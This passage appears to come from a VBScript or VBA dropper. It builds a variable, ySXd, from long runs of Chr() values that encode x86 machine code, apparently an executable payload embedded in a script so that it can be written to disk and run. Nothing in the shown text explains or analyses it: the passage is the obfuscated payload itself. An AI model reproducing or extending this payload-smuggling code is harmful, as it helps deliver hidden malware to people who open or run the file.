ySXd=ySXd&Chr(193)&Chr(141)&Chr(123)&Chr(16)&Chr(171)&Chr(171)&Chr(171)&Chr(235)&Chr(168)&Chr(57)&Chr(53)&Chr(116)&Chr(178)&Chr(64)&Chr(0)&Chr(15)&Chr(133)&Chr(88)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(200)&Chr(255)&Chr(139)&Chr(77)&Chr(252)&Chr(95)&Chr(94)&Chr(51)&Chr(205)&Chr(91)&Chr(232)&Chr(117)&Chr(20)&Chr(0)&Chr(0)&Chr(201)&Chr(195)&Chr(106)&Chr(20)&Chr(104)&Chr(104)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(65)&Chr(234)&Chr(255)&Chr(255)&Chr(131)&Chr(77)&Chr(224)&Chr(255)&Chr(232)&Chr(49)&Chr(231)&Chr(255)&Chr(255)&Chr(139)&Chr(248)&Chr(137)&Chr(125)&Chr(220)&Chr(232)&Chr(220)&Chr(252)&Chr(255)&Chr(255)&Chr(139)&Chr(95)&Chr(104)&Chr(139)&Chr(117)&Chr(8)&Chr(232)&Chr(117)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(8)&Chr(59)&Chr(67)&Chr(4)&Chr(15)&Chr(132)&Chr(87)&Chr(1)&Chr(0)&Chr(0)&Chr(104)&Chr(32)&Chr(2)&Chr(0)&Chr(0)&Chr(232)&Chr(6)
ySXd=ySXd&Chr(2)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(216)&Chr(133)&Chr(219)&Chr(15)&Chr(132)&Chr(70)&Chr(1)&Chr(0)&Chr(0)&Chr(185)&Chr(136)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(119)&Chr(104)&Chr(139)&Chr(251)&Chr(243)&Chr(165)&Chr(131)&Chr(35)&Chr(0)&Chr(83)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(184)&Chr(253)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(137)&Chr(69)&Chr(224)&Chr(133)&Chr(192)&Chr(15)&Chr(133)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(117)&Chr(220)&Chr(255)&Chr(118)&Chr(104)&Chr(255)&Chr(21)&Chr(104)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(17)&Chr(139)&Chr(70)&Chr(104)&Chr(61)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(40)&Chr(78)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(94)&Chr(104)&Chr(83)&Chr(139)&Chr(61)&Chr(92)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(215)&Chr(246)&Chr(70)&Chr(112)&Chr(2)
ySXd=ySXd&Chr(15)&Chr(133)&Chr(234)&Chr(0)&Chr(0)&Chr(0)&Chr(246)&Chr(5)&Chr(16)&Chr(170)&Chr(64)&Chr(0)&Chr(1)&Chr(15)&Chr(133)&Chr(221)&Chr(0)&Chr(0)&Chr(0)&Chr(106)&Chr(13)&Chr(232)&Chr(226)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(139)&Chr(67)&Chr(4)&Chr(163)&Chr(132)&Chr(178)&Chr(64)&Chr(0)&Chr(139)&Chr(67)&Chr(8)&Chr(163)&Chr(136)&Chr(178)&Chr(64)&Chr(0)&Chr(139)&Chr(67)&Chr(12)&Chr(163)&Chr(140)&Chr(178)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(137)&Chr(69)&Chr(228)&Chr(131)&Chr(248)&Chr(5)&Chr(125)&Chr(16)&Chr(102)&Chr(139)&Chr(76)&Chr(67)&Chr(16)&Chr(102)&Chr(137)&Chr(12)&Chr(69)&Chr(120)&Chr(178)&Chr(64)&Chr(0)&Chr(64)&Chr(235)&Chr(232)&Chr(51)&Chr(192)&Chr(137)&Chr(69)&Chr(228)&Chr(61)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(125)&Chr(13)&Chr(138)&Chr(76)&Chr(24)&Chr(28)&Chr(136)&Chr(136)&Chr(0)
ySXd=ySXd&Chr(166)&Chr(64)&Chr(0)&Chr(64)&Chr(235)&Chr(233)&Chr(51)&Chr(192)&Chr(137)&Chr(69)&Chr(228)&Chr(61)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(125)&Chr(16)&Chr(138)&Chr(140)&Chr(24)&Chr(29)&Chr(1)&Chr(0)&Chr(0)&Chr(136)&Chr(136)&Chr(8)&Chr(167)&Chr(64)&Chr(0)&Chr(64)&Chr(235)&Chr(230)&Chr(255)&Chr(53)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(104)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(19)&Chr(161)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(61)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(111)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(29)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(83)&Chr(255)&Chr(215)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(48)&Chr(106)&Chr(13)&Chr(232)&Chr(91)&Chr(236)&Chr(255)&Chr(255)&Chr(89)
ySXd=ySXd&Chr(195)&Chr(235)&Chr(37)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(32)&Chr(129)&Chr(251)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(83)&Chr(232)&Chr(57)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(232)&Chr(234)&Chr(238)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(4)&Chr(131)&Chr(101)&Chr(224)&Chr(0)&Chr(139)&Chr(69)&Chr(224)&Chr(232)&Chr(249)&Chr(232)&Chr(255)&Chr(255)&Chr(195)&Chr(131)&Chr(61)&Chr(236)&Chr(183)&Chr(64)&Chr(0)&Chr(0)&Chr(117)&Chr(18)&Chr(106)&Chr(253)&Chr(232)&Chr(86)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(199)&Chr(5)&Chr(236)&Chr(183)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(136)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(137)&Chr(232)&Chr(255)&Chr(255)&Chr(139)&Chr(117)&Chr(8)&Chr(133)&Chr(246)&Chr(116)&Chr(117)&Chr(131)&Chr(61)
ySXd=ySXd&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(3)&Chr(117)&Chr(67)&Chr(106)&Chr(4)&Chr(232)&Chr(194)&Chr(236)&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(86)&Chr(232)&Chr(201)&Chr(7)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(133)&Chr(192)&Chr(116)&Chr(9)&Chr(86)&Chr(80)&Chr(232)&Chr(234)&Chr(7)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(125)&Chr(228)&Chr(0)&Chr(117)&Chr(55)&Chr(255)&Chr(117)&Chr(8)&Chr(235)&Chr(10)&Chr(106)&Chr(4)&Chr(232)&Chr(174)&Chr(235)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(86)&Chr(106)&Chr(0)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(116)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(22)&Chr(232)&Chr(64)&Chr(238)&Chr(255)&Chr(255)&Chr(139)&Chr(240)
ySXd=ySXd&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(80)&Chr(232)&Chr(240)&Chr(237)&Chr(255)&Chr(255)&Chr(137)&Chr(6)&Chr(89)&Chr(232)&Chr(77)&Chr(232)&Chr(255)&Chr(255)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(87)&Chr(51)&Chr(246)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(41)&Chr(28)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(89)&Chr(133)&Chr(255)&Chr(117)&Chr(39)&Chr(57)&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(31)&Chr(86)&Chr(255)&Chr(21)&Chr(16)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(134)&Chr(232)&Chr(3)&Chr(0)&Chr(0)&Chr(59)&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(3)&Chr(131)&Chr(200)&Chr(255)&Chr(139)&Chr(240)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(202)&Chr(139)&Chr(199)&Chr(95)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(87)&Chr(51)&Chr(246)&Chr(106)
ySXd=ySXd&Chr(0)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(169)&Chr(28)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(255)&Chr(117)&Chr(39)&Chr(57)&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(31)&Chr(86)&Chr(255)&Chr(21)&Chr(16)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(134)&Chr(232)&Chr(3)&Chr(0)&Chr(0)&Chr(59)&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(3)&Chr(131)&Chr(200)&Chr(255)&Chr(139)&Chr(240)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(195)&Chr(139)&Chr(255)&Chr(95)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(87)&Chr(51)&Chr(246)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(125)&Chr(29)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(89)&Chr(89)&Chr(133)&Chr(255)&Chr(117)&Chr(44)&Chr(57)&Chr(69)&Chr(12)&Chr(116)&Chr(39)&Chr(57)
ySXd=ySXd&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(31)&Chr(86)&Chr(255)&Chr(21)&Chr(16)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(134)&Chr(232)&Chr(3)&Chr(0)&Chr(0)&Chr(59)&Chr(5)&Chr(144)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(3)&Chr(131)&Chr(200)&Chr(255)&Chr(139)&Chr(240)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(193)&Chr(139)&Chr(199)&Chr(95)&Chr(94)&Chr(93)&Chr(195)&Chr(85)&Chr(139)&Chr(236)&Chr(87)&Chr(86)&Chr(139)&Chr(117)&Chr(12)&Chr(139)&Chr(77)&Chr(16)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(193)&Chr(139)&Chr(209)&Chr(3)&Chr(198)&Chr(59)&Chr(254)&Chr(118)&Chr(8)&Chr(59)&Chr(248)&Chr(15)&Chr(130)&Chr(164)&Chr(1)&Chr(0)&Chr(0)&Chr(129)&Chr(249)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(114)&Chr(31)&Chr(131)&Chr(61)&Chr(168)&Chr(182)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(22)&Chr(87)&Chr(86)&Chr(131)&Chr(231)&Chr(15)&Chr(131)&Chr(230)
ySXd=ySXd&Chr(15)&Chr(59)&Chr(254)&Chr(94)&Chr(95)&Chr(117)&Chr(8)&Chr(94)&Chr(95)&Chr(93)&Chr(233)&Chr(158)&Chr(31)&Chr(0)&Chr(0)&Chr(247)&Chr(199)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(21)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(226)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(42)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(4)&Chr(64)&Chr(64)&Chr(0)&Chr(144)&Chr(139)&Chr(199)&Chr(186)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(233)&Chr(4)&Chr(114)&Chr(12)&Chr(131)&Chr(224)&Chr(3)&Chr(3)&Chr(200)&Chr(255)&Chr(36)&Chr(133)&Chr(24)&Chr(63)&Chr(64)&Chr(0)&Chr(255)&Chr(36)&Chr(141)&Chr(20)&Chr(64)&Chr(64)&Chr(0)&Chr(144)&Chr(255)&Chr(36)&Chr(141)&Chr(152)&Chr(63)&Chr(64)&Chr(0)&Chr(144)&Chr(40)&Chr(63)&Chr(64)&Chr(0)&Chr(84)&Chr(63)&Chr(64)&Chr(0)&Chr(120)&Chr(63)&Chr(64)&Chr(0)&Chr(35)&Chr(209)&Chr(138)&Chr(6)
ySXd=ySXd&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(138)&Chr(70)&Chr(2)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(131)&Chr(198)&Chr(3)&Chr(131)&Chr(199)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(204)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(4)&Chr(64)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(35)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(1)&Chr(131)&Chr(198)&Chr(2)&Chr(131)&Chr(199)&Chr(2)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(166)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(4)&Chr(64)&Chr(64)&Chr(0)&Chr(144)&Chr(35)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(131)&Chr(198)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(199)&Chr(1)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(136)&Chr(243)&Chr(165)&Chr(255)&Chr(36)
ySXd=ySXd&Chr(149)&Chr(4)&Chr(64)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(251)&Chr(63)&Chr(64)&Chr(0)&Chr(232)&Chr(63)&Chr(64)&Chr(0)&Chr(224)&Chr(63)&Chr(64)&Chr(0)&Chr(216)&Chr(63)&Chr(64)&Chr(0)&Chr(208)&Chr(63)&Chr(64)&Chr(0)&Chr(200)&Chr(63)&Chr(64)&Chr(0)&Chr(192)&Chr(63)&Chr(64)&Chr(0)&Chr(184)&Chr(63)&Chr(64)&Chr(0)&Chr(139)&Chr(68)&Chr(142)&Chr(228)&Chr(137)&Chr(68)&Chr(143)&Chr(228)&Chr(139)&Chr(68)&Chr(142)&Chr(232)&Chr(137)&Chr(68)&Chr(143)&Chr(232)&Chr(139)&Chr(68)&Chr(142)&Chr(236)&Chr(137)&Chr(68)&Chr(143)&Chr(236)&Chr(139)&Chr(68)&Chr(142)&Chr(240)&Chr(137)&Chr(68)&Chr(143)&Chr(240)&Chr(139)&Chr(68)&Chr(142)&Chr(244)&Chr(137)&Chr(68)&Chr(143)&Chr(244)&Chr(139)&Chr(68)&Chr(142)&Chr(248)&Chr(137)&Chr(68)&Chr(143)&Chr(248)&Chr(139)&Chr(68)&Chr(142)&Chr(252)&Chr(137)&Chr(68)&Chr(143)&Chr(252)&Chr(141)&Chr(4)&Chr(141)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(3)&Chr(240)&Chr(3)&Chr(248)&Chr(255)&Chr(36)&Chr(149)&Chr(4)&Chr(64)&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(20)&Chr(64)&Chr(64)&Chr(0)&Chr(28)&Chr(64)&Chr(64)&Chr(0)&Chr(40)&Chr(64)&Chr(64)&Chr(0)&Chr(60)&Chr(64)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(141)&Chr(116)&Chr(49)&Chr(252)
ySXd=ySXd&Chr(141)&Chr(124)&Chr(57)&Chr(252)&Chr(247)&Chr(199)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(36)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(226)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(13)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(247)&Chr(217)&Chr(255)&Chr(36)&Chr(141)&Chr(80)&Chr(65)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(139)&Chr(199)&Chr(186)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(249)&Chr(4)&Chr(114)&Chr(12)&Chr(131)&Chr(224)&Chr(3)&Chr(43)&Chr(200)&Chr(255)&Chr(36)&Chr(133)&Chr(164)&Chr(64)&Chr(64)&Chr(0)&Chr(255)&Chr(36)&Chr(141)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(144)&Chr(180)&Chr(64)&Chr(64)&Chr(0)&Chr(216)&Chr(64)&Chr(64)&Chr(0)&Chr(0)&Chr(65)&Chr(64)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)
ySXd=ySXd&Chr(131)&Chr(238)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(239)&Chr(1)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(178)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(131)&Chr(238)&Chr(2)&Chr(131)&Chr(239)&Chr(2)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(136)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(138)&Chr(70)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(1)&Chr(131)&Chr(238)&Chr(3)&Chr(131)&Chr(239)&Chr(3)&Chr(131)&Chr(249)&Chr(8)
ySXd=ySXd&Chr(15)&Chr(130)&Chr(86)&Chr(255)&Chr(255)&Chr(255)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(84)&Chr(65)&Chr(64)&Chr(0)&Chr(92)&Chr(65)&Chr(64)&Chr(0)&Chr(100)&Chr(65)&Chr(64)&Chr(0)&Chr(108)&Chr(65)&Chr(64)&Chr(0)&Chr(116)&Chr(65)&Chr(64)&Chr(0)&Chr(124)&Chr(65)&Chr(64)&Chr(0)&Chr(132)&Chr(65)&Chr(64)&Chr(0)&Chr(151)&Chr(65)&Chr(64)&Chr(0)&Chr(139)&Chr(68)&Chr(142)&Chr(28)&Chr(137)&Chr(68)&Chr(143)&Chr(28)&Chr(139)&Chr(68)&Chr(142)&Chr(24)&Chr(137)&Chr(68)&Chr(143)&Chr(24)&Chr(139)&Chr(68)&Chr(142)&Chr(20)&Chr(137)&Chr(68)&Chr(143)&Chr(20)&Chr(139)&Chr(68)&Chr(142)&Chr(16)&Chr(137)&Chr(68)&Chr(143)&Chr(16)&Chr(139)&Chr(68)&Chr(142)&Chr(12)&Chr(137)&Chr(68)&Chr(143)&Chr(12)&Chr(139)&Chr(68)&Chr(142)&Chr(8)&Chr(137)&Chr(68)&Chr(143)&Chr(8)
ySXd=ySXd&Chr(139)&Chr(68)&Chr(142)&Chr(4)&Chr(137)&Chr(68)&Chr(143)&Chr(4)&Chr(141)&Chr(4)&Chr(141)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(3)&Chr(240)&Chr(3)&Chr(248)&Chr(255)&Chr(36)&Chr(149)&Chr(160)&Chr(65)&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(176)&Chr(65)&Chr(64)&Chr(0)&Chr(184)&Chr(65)&Chr(64)&Chr(0)&Chr(200)&Chr(65)&Chr(64)&Chr(0)&Chr(220)&Chr(65)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)
ySXd=ySXd&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(83)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(139)&Chr(134)&Chr(188)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(219)&Chr(87)&Chr(59)&Chr(195)&Chr(116)&Chr(111)&Chr(61)&Chr(224)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(104)&Chr(139)&Chr(134)&Chr(176)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(94)&Chr(57)&Chr(24)&Chr(117)&Chr(90)&Chr(139)&Chr(134)&Chr(184)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(23)&Chr(57)&Chr(24)&Chr(117)&Chr(19)&Chr(80)&Chr(232)&Chr(238)&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(188)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(177)&Chr(31)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(139)&Chr(134)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(23)
ySXd=ySXd&Chr(57)&Chr(24)&Chr(117)&Chr(19)&Chr(80)&Chr(232)&Chr(205)&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(188)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(75)&Chr(31)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(255)&Chr(182)&Chr(176)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(181)&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(188)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(170)&Chr(250)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(139)&Chr(134)&Chr(192)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(68)&Chr(57)&Chr(24)&Chr(117)&Chr(64)&Chr(139)&Chr(134)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(45)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(232)&Chr(137)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(134)&Chr(204)&Chr(0)&Chr(0)&Chr(0)&Chr(191)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(43)&Chr(199)&Chr(80)&Chr(232)&Chr(118)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(134)&Chr(208)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(43)&Chr(199)&Chr(80)&Chr(232)&Chr(104)&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(192)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(93)&Chr(250)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(16)&Chr(141)&Chr(190)&Chr(212)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(7)&Chr(61)&Chr(32)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(23)&Chr(57)&Chr(152)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(15)&Chr(80)&Chr(232)&Chr(49)&Chr(29)&Chr(0)&Chr(0)&Chr(255)&Chr(55)&Chr(232)&Chr(54)&Chr(250)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(141)&Chr(126)&Chr(80)&Chr(199)&Chr(69)&Chr(8)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(127)&Chr(248)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(17)&Chr(139)&Chr(7)&Chr(59)&Chr(195)&Chr(116)&Chr(11)&Chr(57)&Chr(24)&Chr(117)&Chr(7)&Chr(80)&Chr(232)&Chr(17)&Chr(250)&Chr(255)&Chr(255)&Chr(89)&Chr(57)
ySXd=ySXd&Chr(21)&Chr(252)&Chr(116)&Chr(18)&Chr(139)&Chr(71)&Chr(4)&Chr(59)&Chr(195)&Chr(116)&Chr(11)&Chr(57)&Chr(24)&Chr(117)&Chr(7)&Chr(80)&Chr(232)&Chr(250)&Chr(249)&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(199)&Chr(16)&Chr(255)&Chr(77)&Chr(8)&Chr(117)&Chr(199)&Chr(86)&Chr(232)&Chr(235)&Chr(249)&Chr(255)&Chr(255)&Chr(89)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(83)&Chr(86)&Chr(139)&Chr(53)&Chr(92)&Chr(128)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(125)&Chr(8)&Chr(87)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(176)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(184)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)
